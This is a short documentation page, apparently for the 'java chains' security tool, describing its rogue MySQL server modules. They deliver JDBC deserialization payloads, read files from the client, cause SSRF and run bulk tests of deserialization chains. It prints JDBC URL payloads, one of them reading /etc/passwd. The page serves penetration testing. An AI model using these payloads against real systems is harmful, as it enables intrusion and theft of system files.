---
title: MySQL JDBC 利用
sidebar_position: 4
---

# MySQL JDBC 利用

## FakeMySQLPayload

MySQL JDBC 反序列化利用姿势

The exploitation methods of the FakeMySQL module and the [JNDI module](jndi.md) are quite similar.

JNDI transmits tokens through LDAP/RMI parameters to match with the backend and return the corresponding Payload.

In contrast, FakeMySQL passes the token parameter via the MySQL JDBC username.

This module also shares the same fallback mechanism as the JNDI module: if a token is not matched, it will default to returning the latest generated Payload.

## FakeMySQLReadPayload

MySQL JDBC 客户端文件读取、SSRF 姿势

这里支持两个传参方式，第一种是在 java chains 输入参数，然后返回一个 token，把该放入 jdbc payload 中

![](@site/static/doc/mysql-read.png)

```
jdbc:mysql://127.0.0.1:3308/test?user=[TOKEN]
```

第二种传参方式是在 username 中设置参数，格式为：`fileread_[file name]`

其中 fileread_ 是固定前缀，后缀跟要读取的文件名，例如下面 JDBC 读取文件 Payload

```
jdbc:mysql://127.0.0.1:3308/test?user=fileread_/etc/passwd
```

## FakeMySQLSHPayload

FakeMySQL 反序列化梭哈链，一键测试常规反序列化链，提高测试效率

![](@site/static/doc/mysql-showhand.png)

可放入到 Burp 中进行批量爆破测试
![](@site/static/doc/fake-mysql.png)

总体使用流程等同于 JNDI 的梭哈链，可进行参考: [JNDIShowHandPayload](./jndi.md#jndishowhandpayload)

## 参考

- https://github.com/4ra1n/mysql-fake-server